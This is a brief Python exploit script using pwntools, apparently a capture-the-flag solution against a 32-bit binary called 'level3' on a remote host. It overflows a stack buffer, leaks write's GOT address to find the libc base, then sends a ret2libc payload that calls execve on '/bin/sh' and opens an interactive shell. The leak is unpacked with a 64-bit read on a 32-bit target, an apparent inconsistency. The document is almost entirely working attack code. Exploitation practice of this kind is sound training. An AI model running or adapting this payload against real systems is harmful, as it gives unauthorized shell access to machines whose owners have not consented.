from pwn import *
import time
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('220.249.52.134',41582)
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

main=0x08048484
payload="A"*0x8c+p32(elf.plt["write"])+p32(main)+p32(1)+p32(elf.got["write"])+p32(8)
sla("Input:\n",payload)
libc_base=u64(target.recv(8))-libc.sym["write"]
print("libc base = "+hex(libc_base))
libc_execve=libc_base+libc.sym["execve"]
libc_binsh=libc_base+libc.search("/bin/sh").next()
payload="A"*0x8c+p32(libc_execve)+p32(0xdeadbeef)+p32(libc_binsh)+p32(0)*2
sla("Input:\n",payload)
target.interactive()
